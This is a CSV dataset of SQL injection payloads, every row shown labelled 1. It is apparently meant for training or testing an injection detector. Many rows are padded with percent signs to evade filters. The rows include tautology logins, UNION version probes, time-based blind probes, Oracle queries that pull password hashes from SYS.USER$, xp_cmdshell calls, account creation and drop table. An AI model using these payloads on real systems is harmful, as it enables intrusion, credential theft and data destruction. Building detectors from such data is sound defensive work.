Query,Label
%s%e%%l%ec%t * %f%%r%%om users %%w%%he%%r%%e id  =  1. o%%r 1  =  1 -- 1,1
" %%se%%l%ec%%t * %%f%ro%m users %wh%%e%%re id  =  1 %%or @#"",  =  1 %%uni%%o%%n %%se%%l%ec%%t 1,version  (    )   -- 1",1
" %s%e%l%e%c%t * %fr%o%m users %%w%%he%%re id  =  1 o%%r "";@"" o%%r 1  =  1 -- 1",1
â %%o%%r 3  =  3 --,1
 %%a%n%d 1  =  utl_%i%%naddr.get_host_address   (    (   %%s%%elec%%t global_name %%f%%r%%o%m global_name   )    )    %%a%n%d 'i'  =  'i,1
" %%s%e%%l%ec%t * %f%ro%%m users w%h%e%re id  =  1 +1 %%un%%io%%n %%s%e%%l%ec%t null,banner %f%ro%%m v$version w%h%e%re rownum  =  1 -- 1",1
" s%el%e%c%t * %fro%%m users wh%%e%re id  =  1 %%o%r "",,""  =  1 %%o%r 1  =  1 -- 1",1
" %%s%%e%%le%%c%t * %f%ro%%m users w%h%e%r%%e id  =  1 + $+%1 %un%io%n %%s%%e%%le%%c%t %nu%%l%l,@@VERSION -- 1",1
" %se%l%%ec%%t * %f%r%o%m users %%wh%e%r%%e id  =  1 %or 1#""? u%%n%ion %se%l%%ec%%t version  (    )  ,version  (    )   -- 1",1
" %%se%%lec%t * %f%%ro%%m users %whe%%re id  =  1 %%o%r ""  )  1"" %%o%r 1  =  1 -- 1",1
 %or uid l%i%%k%e '%,1
%s%%e%l%e%%c%%t * %%fr%%o%%m users %%wh%%e%re id  =  '1' <@&1 %o%%r 1  =  1 -- 1',1
" %s%%e%%lect * f%ro%%m users w%%h%e%r%%e id  =  '1' u%%ni%%o%n %s%%e%%lect !<1,version  (    )   -- 1'",1
23 %%o%%r 1  =  1; --,1
" se%l%%e%c%%t * %%f%%ro%%m users wher%e id  =  1 %%o%%r \<\. %%u%%n%io%n se%l%%e%c%%t 1,@@VERSION -- 1",1
" s%%e%le%%ct * fr%o%%m users %%w%he%r%e id  =  1 %%o%%r ""{  (  ""  =  1 %%o%%r 1  =  1 -- 1",1
" %%sel%%e%%c%%t * %%f%%r%o%%m users %w%%h%e%r%e id  =  1 %%o%r ""%_"" %%o%r 1  =  1 -- 1",1
s%el%%e%%c%%t * %%fr%o%%m users whe%r%e id  =  1 +   (  \.  )   o%%r 1  =  1 -- 1,1
" s%e%le%c%t * %fr%%o%m users %%w%%he%%r%e id  =  '1' u%%n%i%on s%e%le%c%t \,@@VERSION -- 1'",1
0 %%or 1  =  1,1
s%el%%ect * %%f%rom users %w%%he%%r%e id  =  1 &@ %o%r 1  =  1 -- 1,1
"adm%i%%n""  )   %%or ""1""  =  ""1",1
se%%l%%e%%ct * %f%%ro%%m users wh%%e%re id  =  1 %or \<   =  1 %or 1  =  1 -- 1,1
" %%sel%e%%c%t * %%fr%om users %%w%h%%ere id  =  1 %%o%%r ""??"" %%o%%r 1  =  1 -- 1",1
" %%a%nd 1  =  utl_%i%%naddr.get_host_address   (    (   %sel%%ec%t D%isT%i%%nCT  (  PASSW%%o%%rD  )   %%f%r%%om   (  %sel%%ec%t D%isT%i%%nCT  (  PASSW%%o%%rD  )  , ROWNUM AS l%%i%mit %%f%r%%om SYS.USER$  )   w%%h%e%%re l%%i%mit  =  5   )    )    %%a%nd 'i'  =  'i",1
" %%a%%n%%d 1  =  utl_%%inaddr.get_host_address   (    (   %s%e%l%e%c%t DisT%%inCT  (  column_name  )   %%f%r%om   (  %s%e%l%e%c%t DisT%%inCT  (  column_name  )  , ROWNUM AS %%li%%m%i%t %%f%r%om all_tab_columns  )   %wh%ere %%li%%m%i%t  =  7   )    )    %%a%%n%%d 'i'  =  'i",1
&apos; o%r,1
sqlvuln;,1
%%s%e%l%%e%%c%t * %fr%%o%%m users w%%he%%r%e id  =  1 + $+%$ %o%r 1  =  1 -- 1,1
%%s%e%le%c%%t * f%%r%%o%%m users %%w%h%%ere id  =  '1' + $+%\ %or 1  =  1 -- 1',1
""" %o%r """"*""",1
"hi %o%%r 1  =  1 --""",1
" %%s%elect * %f%r%%o%m users wh%%e%re id  =  1. %un%%i%%on %%s%elect nu%%l%l,banner %f%r%%o%m v$version wh%%e%re rownum  =  1 -- 1",1
; exec master..xp_cmdshell 'p%ing 172.10.1.255'--,1
" %%s%%e%%l%ec%t * %%f%ro%%m users %w%%h%%e%%r%%e id  =  '1' %%or 1^  =  1 un%ion %%s%%e%%l%ec%t 1,banner %%f%ro%%m v$version %w%%h%%e%%r%%e rownum  =  1 -- 1'",1
" %s%e%le%%ct * %f%r%o%m users %w%h%%e%%r%e id  =  '1' %%u%ni%%o%%n %s%e%le%%ct ""?""_,version  (    )   -- 1'",1
%%sel%e%%ct * %from %i%nf%%o%%rmation_schema.t%%ab%l%%es--,1
se%%l%ec%t * %f%%r%%o%m users %w%%h%%e%%r%%e id  =  1 or \<\. or 1  =  1 -- 1,1
   (  s%el%%ec%t top 1,1
Ã½ %or 1  =  1 --,1
a' --,1
 %o%%r 1  =  1 /*,1
" %s%%e%lec%%t * %%f%ro%%m users %w%%h%%e%r%e id  =  1 o%r 1#"", %%un%%i%o%%n %s%%e%lec%%t %%n%u%%l%l,version  (    )   -- 1",1
" %%s%e%%l%%e%c%t * %%f%%ro%m users %%whe%%r%e id  =  '1' %%u%%n%%io%%n %%s%e%%l%%e%c%t $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlog%%i%n 'name' , 'password'",1
" se%%l%ec%t * %fr%%o%m users %%wh%%er%e id  =  1   %%un%%io%n se%%l%ec%t n%u%%l%%l,banner %fr%%o%m v$version %%wh%%er%e rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
" s%%e%le%%ct * f%%r%%o%%m users %%w%h%er%e id  =  1 %%o%r "".  )  "" %%o%r 1  =  1 -- 1",1
" s%e%l%%e%%c%%t * %fr%om users %%w%%h%%e%%re id  =  1 o%%r @<@  =  1 u%n%i%%o%n s%e%l%%e%%c%%t 1,version  (    )   -- 1",1
group %by userid hav%ing 1  =  1--,1
" %%se%%l%ec%t * %%f%ro%m users %%w%%h%er%e id  =  1 + \+%1 %u%ni%%on %%se%%l%ec%t nu%ll,@@VERSION -- 1",1
%%se%%l%%e%c%t * %%from users w%he%r%%e id  =  1 *1 or 1  =  1 -- 1,1
" se%%lec%t * %f%%ro%%m users %w%he%r%e id  =  1 o%%r @#"";  =  1 o%%r 1  =  1 -- 1",1
‘ or 1  =  1 --,1
" %se%l%%e%%c%t * %%f%rom users %w%h%e%%re id  =  1 *\. u%nio%n %se%l%%e%%c%t nu%l%%l,@@VERSION -- 1",1
%%se%%l%ect * %fr%%om users %w%%her%e id  =  1 %  (  @  )   o%r 1  =  1 -- 1,1
%o%r 'a'  =  'a,1
declare @s varchar  (  22  )   %%se%l%ect @s   = ,1
" %s%%e%lec%t * %%f%%ro%%m users %wh%%e%re id  =  1 %u%ni%o%n %s%%e%lec%t 1<@,version  (    )   -- 1",1
" %se%%le%%c%%t * %f%ro%m users w%h%%e%%r%e id  =  1 + \+*\ u%%n%%i%%on %se%%le%%c%%t %nul%%l,@@VERSION -- 1",1
" %se%le%c%%t * f%r%o%%m users %%whe%%r%%e id  =  1 %or 1#"". un%i%o%%n %se%le%c%%t version  (    )  ,version  (    )   -- 1",1
@variable,1
; exec master..xp_cmdshell,1
%%sel%%e%%c%%t * f%%r%o%%m users w%here id  =  1 +  (  1  )   %o%%r 1  =  1 -- 1,1
" %%s%el%ec%t * fr%o%%m users w%%h%%er%%e id  =  1 %un%i%%on %%s%el%ec%t @ 1$,version  (    )   -- 1",1
" %se%l%%e%%ct * fr%%o%m users %wh%ere id  =  1 u%ni%o%%n %se%l%%e%%ct @ 1a,version  (    )   -- 1",1
" s%e%%lect * %%f%%ro%%m users w%%her%e id  =  1 %o%r  @$#  =  1 %u%n%io%n s%e%%lect 1,version  (    )   -- 1",1
" s%e%%le%%ct * %f%%ro%m users w%her%e id  =  '1' o%r   (  \.  )    =  1 %%u%%n%i%%o%%n s%e%%le%%ct 1,@@VERSION -- 1'",1
 an%%d 1 i%%n   (  %%s%%el%e%c%%t var %fr%o%m temp  )  --,1
" %s%e%l%e%%c%t * f%r%o%m users w%%he%%r%e id  =  '1' %unio%n %s%e%l%e%%c%t 1""!"",banner f%r%o%m v$version w%%he%%r%e rownum  =  1 -- 1'",1
" %s%%e%l%e%ct * fr%%o%%m users w%h%e%%r%e id  =  1 or ""1]"" or 1  =  1 -- 1",1
" %%s%%el%e%%c%t * %%f%%r%%o%m users %%w%he%%r%%e id  =  1 %o%r ""$?"" %o%r 1  =  1 -- 1",1
%%or x  =  x,1
o%r a  =  a,1
o%%r '1'  =  '1,1
" %s%%elect * %%f%ro%m users %%w%h%e%r%%e id  =  11<1# uni%%o%%n %s%%elect 1,version  (    )   -- 1",1
   )    )    %o%%r    (    (   'x'   )    )     =     (    (   'x,1
" s%%ele%ct * %fro%m users wh%e%%re id  =  '1' %o%r \.<1 u%%n%i%o%n s%%ele%ct 1,@@VERSION -- 1'",1
" %%s%elec%t * %f%ro%m users wher%%e id  =  '1' <@&1 %u%n%%i%o%%n %%s%elec%t 1,version  (    )   -- 1'",1
" a%n%%d 1  =  utl_%%i%naddr.get_host_address   (    (   s%e%%lec%t D%%isT%%i%nCT  (  %%t%able_name  )   %fr%o%%m   (  s%e%%lec%t D%%isT%%i%nCT  (  %%t%able_name  )  , ROWNUM AS %li%m%%it %fr%o%%m sys.all_%%t%ables  )   %%w%he%%r%%e %li%m%%it  =  4   )    )    a%n%%d 'i'  =  'i",1
; if %is_srvrolemember  (  'sysadm%in'  )   > 0 waitfo%%r delay '0:0:2' --,1
s%el%%ect * %%from users w%%h%%e%%r%%e id  =  1 <@<@ %%o%r 1  =  1 -- 1,1
" %%s%%el%%ect * f%%ro%%m users w%h%ere id  =  1 un%%i%on %%s%%el%%ect @<@$,version  (    )   -- 1",1
" %%sel%e%ct * %f%r%o%m users w%h%e%%re id  =  '1' <@<@ %%u%n%i%%o%%n %%sel%e%ct 1,version  (    )   -- 1'",1
" sel%%e%%ct * %fro%%m users w%%he%%re id  =  1 or ""$_"" or 1  =  1 -- 1",1
" %%se%%l%ect * %f%r%%om users %wh%%e%%r%e id  =  1 o%r 1#""{ u%nio%n %%se%%l%ect version  (    )  ,version  (    )   -- 1",1
a' %o%r 1  =  1--,1
 )   %o%%r   (  a  =  a,1
"""   )    )    o%%r    (    (   ""x""   )    )     =     (    (   ""x",1
" s%%el%e%c%t * fr%o%m users %%w%%h%er%%e id  =  1 or 1#""; or 1  =  1 -- 1",1
" sel%ect * %f%%r%%o%m users %%w%h%e%r%%e id  =  '1' <@$_ %un%i%%o%%n sel%ect 1,version  (    )   -- 1'",1
-- &passw%%ord  = ,1
%se%%lect * %%f%r%%o%%m users %w%%he%%r%e id  =  1 <@. or 1  =  1 -- 1,1
" %se%l%%ec%t * %f%%r%%o%%m users w%%he%r%e id  =  1 %o%r ""  (    )  "" %o%r 1  =  1 -- 1",1
" s%e%l%e%c%t * f%%r%%o%%m users %%w%h%%e%%r%e id  =  1 %$ 1 %%un%i%%on s%e%l%e%c%t n%u%l%l,@@VERSION -- 1",1
" a%%nd 1  =  utl_%i%%naddr.get_host_address   (    (   %%s%e%%lec%%t D%i%%sT%i%%nCT  (  granted_role  )   f%r%%om   (  %%s%e%%lec%%t D%i%%sT%i%%nCT  (  granted_role  )  , ROWNUM AS %%l%i%mi%t f%r%%om dba_role_privs %w%h%%e%%r%e GRANTEE  =  SYS.LOG%i%%nUSER  )   %w%h%%e%%r%e %%l%i%mi%t  =  3   )    )    a%%nd 'i'  =  'i",1
 o%%r '1'  =  '1,1
adm%in' or 1  =  1,1
" %s%%e%%le%%c%t * %f%ro%%m users %%w%he%%r%%e id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1
" %%s%e%%l%%e%%c%t * f%%r%o%m users %w%he%r%e id  =  1 %%u%%n%%i%%on %%s%e%%l%%e%%c%t @||1,version  (    )   -- 1",1
" %%se%l%e%ct * %%f%rom users %w%h%e%r%%e id  =  1 +\+. u%%n%%i%%on %%se%l%e%ct nul%l,@@VERSION -- 1",1
" %se%%lect * fr%%om users %w%%he%r%%e id  =  1 o%%r ""  )  ,"" o%%r 1  =  1 -- 1",1
" %u%%n%ion %%s%elec%t * fr%o%m users %w%h%er%e log%in   =   char  (  114,111,111,116  )  ;",1
" %s%e%le%c%%t * %%f%%r%%o%m users wh%%e%r%%e id  =  1 %%o%%r 1#""? %%u%nio%n %s%e%le%c%%t 1,version  (    )   -- 1",1
 o%%r 1  =  1--,1
" %an%d 1  =  utl_%i%%naddr.get_host_address   (    (   %s%ele%c%%t Di%sT%i%%nCT  (  granted_role  )   %fr%o%m   (  %s%ele%c%%t Di%sT%i%%nCT  (  granted_role  )  , ROWNUM AS %l%%i%m%i%%t %fr%o%m dba_role_privs %w%%h%%e%r%%e GRANTEE  =  SYS.LOG%i%%nUSER  )   %w%%h%%e%r%%e %l%%i%m%i%%t  =  5   )    )    %an%d 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ o%%r 3  =  3 --,1
" %s%e%le%%c%%t * %f%rom users %wh%%e%%r%e id  =  1 -1<@ %%u%%n%%i%%o%%n %s%e%le%%c%%t 1,version  (    )   -- 1",1
" %s%e%%l%ec%%t * %%fro%%m users w%he%%re id  =  1 o%%r ""$#"" o%%r 1  =  1 -- 1",1
 )   %%u%n%%i%o%n %%s%e%%lec%%t * fro%m %i%nfo%rmation_schema.ta%%bl%%es;,1
" %%se%%l%e%c%%t * %%f%%rom users w%he%%r%e id  =  1 o%r ""  )  ]"" o%r 1  =  1 -- 1",1
"  )   %or benchmark  (  10000000,MD5  (  1   )    )   #",1
 an%d 1  =  utl_%i%naddr.get_host_address   (    (   %%s%%el%%e%ct COUNT  (  D%isT%i%nCT  (  column_name   )    )    %%f%%r%%o%%m sys.all_tab_columns   )    )    an%d 'i'  =  'i,1
" %a%n%%d 1  =  utl_%inaddr.get_host_address   (    (   %s%%e%%l%%ec%t D%isT%inCT  (  %ta%ble_name  )   %f%rom   (  %s%%e%%l%%ec%t D%isT%inCT  (  %ta%ble_name  )  , ROWNUM AS %%l%i%m%%i%t %f%rom sys.all_%ta%bles  )   %%w%%h%%e%re %%l%i%m%%i%t  =  7   )    )    %a%n%%d 'i'  =  'i",1
""" %or """" """,1
de%l%e%t%%e,1
;waitf%%or delay '0:0:__TIME__'--,1
 %%o%%r 1  =  1 --,1
1' %%an%d non_ex%i%stant_%%ta%ble   =   '1,1
" s%e%%l%%ect * %%fr%%o%%m users w%%h%%e%%r%%e id  =  1 %%o%%r ""&  )  "" %%o%%r 1  =  1 -- 1",1
" %s%%e%%l%%e%%c%t * %from users %%w%%h%%e%%r%e id  =  '1' + $ . %%u%%n%i%%on %s%%e%%l%%e%%c%t 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   s%%e%le%%c%%t @s   =   0x77616974 ...,1
x' %an%%d userid %%i%s %%nu%l%l; --,1
" s%%e%l%%e%%c%%t * %f%r%%om users w%%he%r%%e id  =  1 %o%%r "";["" %o%%r 1  =  1 -- 1",1
" %se%%l%%e%%c%%t * %%f%rom users w%h%er%e id  =  '1' o%%r \.<   =  1 %u%%n%%i%%o%n %se%%l%%e%%c%%t 1,@@VERSION -- 1'",1
" %s%%e%%le%%ct * %f%%r%om users wher%e id  =  1 u%n%%io%%n %s%%e%%le%%ct @<@,version  (    )   -- 1",1
" s%e%l%%e%%c%t * %%fr%o%%m users %w%%he%%re id  =  1 -@<@ %%un%%ion s%e%l%%e%%c%t 1,version  (    )   -- 1",1
 %%and 1  =  utl_%i%naddr.get_host_address   (    (   %s%%e%%l%ect host_name f%%ro%%m v$%i%nstance   )    )    %%and 'i'  =  'i,1
" %%an%%d 1  =  utl_%i%%naddr.get_host_address   (    (   s%%e%%le%%ct D%i%sT%i%%nCT  (  column_name  )   %f%%ro%m   (  s%%e%%le%%ct D%i%sT%i%%nCT  (  column_name  )  , ROWNUM AS %l%%i%%m%i%%t %f%%ro%m all_tab_columns  )   w%%h%er%%e %l%%i%%m%i%%t  =  2   )    )    %%an%%d 'i'  =  'i",1
%s%%e%%l%%e%%ct * %fr%om users %w%%h%%e%re id  =  1 +   (  \+  )   %%o%r 1  =  1 -- 1,1
" %%s%el%e%%ct * %%f%%r%%o%m users w%here id  =  1 %o%%r "".["" %o%%r 1  =  1 -- 1",1
" %s%ele%ct * %f%r%om users wh%%e%re id  =  1 or ""  (  ["" or 1  =  1 -- 1",1
%%u%%n%%i%on ALL %%s%%e%l%%e%%c%%t,1
" %%s%e%%l%%e%%c%t * %f%%rom users %w%%here id  =  1 %o%r ""1#"" %o%r 1  =  1 -- 1",1
%s%el%%ec%t * %%fro%%m users %%w%h%%e%%re id  =  1 %or \<1 %or 1  =  1 -- 1,1
" se%l%ect * fr%o%m users %%w%h%e%r%%e id  =  1 | |1 %%u%%n%i%%on se%l%ect 1,banner fr%o%m v$version %%w%h%e%r%%e rownum  =  1 -- 1",1
x' %o%r full_name l%%i%%k%%e '%bob%,1
x' an%%d members.email i%s %n%ul%%l; --,1
 %%or 2 > 1,1
se%%l%%e%ct * f%ro%m users %w%%h%%er%e id  =  1.*1 o%%r 1  =  1 -- 1,1
"""  )   %or pg_sleep  (  __TIME__  )  --",1
 ',1
" %s%%el%e%c%%t * f%%ro%%m users %%w%h%e%r%%e id  =  1 %%or $<\. %%un%%io%%n %s%%el%e%c%%t 1,@@VERSION -- 1",1
" %s%%e%l%e%ct * %%f%r%%o%m users wh%%e%r%e id  =  1 %o%r ""@  )  "" %o%r 1  =  1 -- 1",1
se%%l%%ec%%t * %%f%%ro%%m users %%wh%e%r%e id  =  1 %%o%r \.<$ %%o%r 1  =  1 -- 1,1
 )   %o%%r sleep  (  __TIME__  )    =  ',1
sleep 50',1
" %%se%le%%c%%t * f%r%o%%m users %whe%%r%e id  =  '1' + 1||1 unio%n %%se%le%%c%%t 1,banner f%r%o%%m v$version %whe%%r%e rownum  =  1 -- 1'",1
s%el%e%%c%%t * %f%%r%o%m users %wh%e%%r%e id  =  1 + $+%\ %%o%%r 1  =  1 -- 1,1
" %s%e%%le%%ct * from users %wh%e%r%%e id  =  1 %%o%%r "";  (  "" %%o%%r 1  =  1 -- 1",1
%o%%r sleep  (  __TIME__  )    =  ',1
" s%%elect * fr%om users %%w%he%r%e id  =  1 %o%r "";_"" %o%r 1  =  1 -- 1",1
" %se%l%e%%ct * %f%r%%om users %wh%e%r%e id  =  1 %or 1#"". %u%n%i%o%n %se%l%e%%ct 1,version  (    )   -- 1",1
" %%s%e%%l%e%c%%t * %f%r%%o%%m users w%he%%r%%e id  =  1 u%%n%%i%o%n %%s%e%%l%e%c%%t  @ $,version  (    )   -- 1",1
" %s%e%%l%%e%c%%t * %%f%r%%om users %%wh%%e%r%e id  =  1 u%%n%%ion %s%e%%l%%e%c%%t +!<@,version  (    )   -- 1",1
" %%s%%e%le%%c%t * %f%r%o%m users %wh%%e%%re id  =  1 <@<@ u%ni%%o%%n %%s%%e%le%%c%t %nu%%l%l,version  (    )   -- 1",1
%or 2 > 1,1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1
anythi%ng' or 'x'  =  'x,1
" %s%%e%l%%e%c%t * %f%ro%m users %w%h%ere id  =  1 %%o%r \<\ %%u%%n%i%%on %s%%e%l%%e%c%t 1,@@VERSION -- 1",1
" %%s%el%e%%c%t * %f%r%%o%m users whe%%r%%e id  =  1 %u%n%i%%on %%s%el%e%%c%t   (  1  )  ,banner %f%r%%o%m v$version whe%%r%%e rownum  =  1 -- 1",1
" s%e%%l%%ect * %%f%ro%m users %whe%re id  =  1 *  (  \  )   u%%ni%on s%e%%l%%ect %%nul%l,@@VERSION -- 1",1
&',1
a' %%o%r 3  =  3--,1
" %%s%e%l%e%c%t * %%fr%%o%%m users %%w%%her%e id  =  '1' %%o%%r $+<$ %u%%n%%io%%n %%s%e%l%e%c%t 1,@@VERSION -- 1'",1
" %%s%%e%le%%c%%t * %%fr%%o%%m users %%whe%r%%e id  =  1 +1 %uni%o%%n %%s%%e%le%%c%%t 1,banner %%fr%%o%%m v$version %%whe%r%%e rownum  =  1 -- 1",1
"admi%n""or 1  =  1 or """"  =  """,1
uni/**/on sel/**/ect,1
""" %%o%r """"&""",1
 )    )   ;waitf%%o%r delay '0:0:__TIME__'--,1
" %%se%%lec%%t * f%r%%om users %%w%h%er%e id  =  1 %%o%%r ""?;"" %%o%%r 1  =  1 -- 1",1
1 waitf%o%%r delay '0:0:10'--,1
bfilename,1
admin'  )   o%r   (  '1'  =  '1'--,1
UEf,1
 -- &passw%%o%rd  = ,1
1 %%o%r sleep  (  __TIME__  )  #,1
" %a%nd 1  =  utl_%i%%naddr.get_host_address   (    (   s%el%e%%c%%t D%%i%sT%i%%nCT  (  %t%ab%%l%%e_name  )   f%%r%om   (  s%el%e%%c%%t D%%i%sT%i%%nCT  (  %t%ab%%l%%e_name  )  , ROWNUM AS li%m%i%%t f%%r%om sys.all_%t%ab%%l%%es  )   w%he%r%%e li%m%i%%t  =  6   )    )    %a%nd 'i'  =  'i",1
" s%ele%%c%%t * %f%%r%o%m users w%%h%%er%e id  =  '1' %uni%%o%%n s%ele%%c%%t $[""],@@VERSION -- 1'",1
" %%selec%%t * %f%r%%o%m users %%w%%he%r%e id  =  '1' + @  (  1  )   u%%n%i%o%n %%selec%%t 1,version  (    )   -- 1'",1
1' %%an%%d 1  =    (  se%l%e%ct count  (  *  )   fro%m t%ablenames  )  ; --,1
%o%r sleep  (  __TIME__  )  #,1
" a%%n%d 1  =  utl_i%%naddr.get_host_address   (    (   %%selec%t D%%i%%sTi%%nCT  (  granted_role  )   %%f%%r%%o%m   (  %%selec%t D%%i%%sTi%%nCT  (  granted_role  )  , ROWNUM AS %l%%i%m%i%%t %%f%%r%%o%m dba_role_privs wh%%er%e GRANTEE  =  SYS.LOGi%%nUSER  )   wh%%er%e %l%%i%m%i%%t  =  8   )    )    a%%n%d 'i'  =  'i",1
" s%e%l%%e%%c%t * %%f%r%o%%m users %%wher%%e id  =  1 o%r 1#"",  =  1 o%r 1  =  1 -- 1",1
||6,1
%or 1/*,1
" an%%d 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
%s%e%l%e%c%%t * f%r%o%m users %%w%h%e%%re id  =  1.%@ %%o%r 1  =  1 -- 1,1
" %sele%%c%t * %%f%r%o%%m users %%w%h%%e%%r%%e id  =  1 %o%r ""..""  =  1 %o%r 1  =  1 -- 1",1
" se%%l%%e%c%t * f%r%%o%%m users %%whe%r%%e id  =  1 %or 1&@#  =  1 %%u%nion se%%l%%e%c%t 1,version  (    )   -- 1",1
" %se%l%%ect * %fr%o%%m users %w%h%%e%%re id  =  1 %o%%r "";]"" %o%%r 1  =  1 -- 1",1
" %%o%%r 1  =  1 %%o%%r """"  =  ",1
" %%a%%n%%d 1  =  utl_%%i%%naddr.get_host_address   (    (   s%e%%l%e%%ct D%%i%%sT%%i%%nCT  (  PASSW%o%%rD  )   %f%rom   (  s%e%%l%e%%ct D%%i%%sT%%i%%nCT  (  PASSW%o%%rD  )  , ROWNUM AS %l%im%i%%t %f%rom SYS.USER$  )   w%%her%%e %l%im%i%%t  =  7   )    )    %%a%%n%%d 'i'  =  'i",1
%s%e%l%%ect * %f%r%om users %whe%r%%e id  =  1 %o%%r $<\. %o%%r 1  =  1 -- 1,1
" %%s%%ele%%c%%t * fr%%o%%m users %%wh%e%%r%%e id  =  1 *  (  1  )   %un%i%%o%%n %%s%%ele%%c%%t 1,banner fr%%o%%m v$version %%wh%e%%r%%e rownum  =  1 -- 1",1
o%r 'whatever' %%in   (  'whatever'  ) ,1
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
%s%e%lect * %%from users %wh%e%r%%e id  =  '1'   o%r 1  =  1 -- 1',1
?,1
 %a%nd 1  =  utl_%inaddr.get_host_address   (    (   %s%e%%l%e%ct COUNT  (  Di%sT%inCT  (  %%t%%a%b%%l%e_name   )    )    %from sys.all_%%t%%a%b%%l%es   )    )    %a%nd 'i'  =  'i,1
" %s%%e%%l%e%%c%t * f%r%o%%m users %w%%h%e%re id  =  '1' %u%%ni%o%%n %s%%e%%l%e%%c%t @ 1,version  (    )   --  1'",1
"adm%i%%n""  )   %%o%%r   (  ""1""  =  ""1""#",1
" %se%le%%c%t * f%%r%%o%%m users %w%%h%e%re id  =  1 or 1#"", %%uni%%o%n %se%le%%c%t 'a',version  (    )   -- 1",1
" %%s%%el%%ect * %fr%o%%m users %%wh%ere id  =  1 o%r ""$  (  "" o%r 1  =  1 -- 1",1
 o%r '' ',1
" %%selec%%t * f%r%%o%m users %wh%%e%%r%e id  =  1 %o%%r "";#"" %o%%r 1  =  1 -- 1",1
%%or 1  =  1,1
 ; %d%%ro%%p %tab%%le temp --,1
" %%an%d 1  =  utl_%%i%%naddr.get_host_address   (    (   %%s%%e%%le%ct D%i%sT%%i%%nCT  (  PASSW%o%rD  )   fr%o%m   (  %%s%%e%%le%ct D%i%sT%%i%%nCT  (  PASSW%o%rD  )  , ROWNUM AS l%%im%i%%t fr%o%m SYS.USER$  )   w%%h%%e%re l%%im%i%%t  =  2   )    )    %%an%d 'i'  =  'i",1
""" %%o%%r benchmark  (  10000000,MD5  (  1   )    )   #",1
""" %%o%r ""x""  =  ""x",1
%%se%lec%%t * f%%r%om users w%%here id  =  '1'<@.. or 1  =  1 -- 1',1
" %se%l%ec%t * %%f%r%%om users %%w%h%%e%%re id  =  1 %%o%%r !<@ %un%%i%%o%%n %se%l%ec%t 1,version  (    )   -- 1",1
 %o%%r 'someth%%ing' li%k%e 'some%',1
; if %n%o%%t   (    (   se%%le%%c%t serverproperty  (  '%%is%%i%%ntegratedsecurityonly'   )    )    <> 0  )   waitfo%%r delay '0:0:2' --,1
" %%a%%n%d 1  =  utl_%%i%naddr.get_host_address   (    (   %%sel%ect D%%isT%%i%nCT  (  PASSW%o%rD  )   %f%%r%om   (  %%sel%ect D%%isT%%i%nCT  (  PASSW%o%rD  )  , ROWNUM AS %l%im%%i%t %f%%r%om SYS.USER$  )   %%wh%%e%r%e %l%im%%i%t  =  4   )    )    %%a%%n%d 'i'  =  'i",1
%%s%%el%ect * %f%%r%o%m users %w%h%%e%%re id  =  '1' or \<\. or 1  =  1 -- 1',1
; exec master..xp_cmdshell 'pi%ng 10.10.1.2'--,1
admin' o%%r '1'  =  '1'--,1
; if n%o%%t   (    (   %se%l%e%c%t serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfo%r delay '0:0:2' --,1
" %an%d 1  =  utl_%i%naddr.get_host_address   (    (   %s%%e%%l%e%ct D%i%sT%i%nCT  (  %t%a%b%%l%e_name  )   f%%r%%o%%m   (  %s%%e%%l%e%ct D%i%sT%i%nCT  (  %t%a%b%%l%e_name  )  , ROWNUM AS l%%i%m%i%%t f%%r%%o%%m sys.all_%t%a%b%%l%es  )   %w%h%%ere l%%i%m%i%%t  =  2   )    )    %an%d 'i'  =  'i",1
" se%%l%%e%c%%t * fr%%o%%m users %w%%her%%e id  =  1 <@<@ %un%i%%o%%n se%%l%%e%c%%t version  (    )  ,version  (    )   -- 1",1
" %%se%l%ec%t * %f%r%%om users w%h%%e%%r%%e id  =  1 %or 1#""$ %u%ni%%o%n %%se%l%ec%t %%n%%u%%l%l,version  (    )   -- 1",1
""";waitf%%o%%r delay '0:0:__TIME__'--",1
x' %a%n%%d userid %%i%%s %%n%ull; --,1
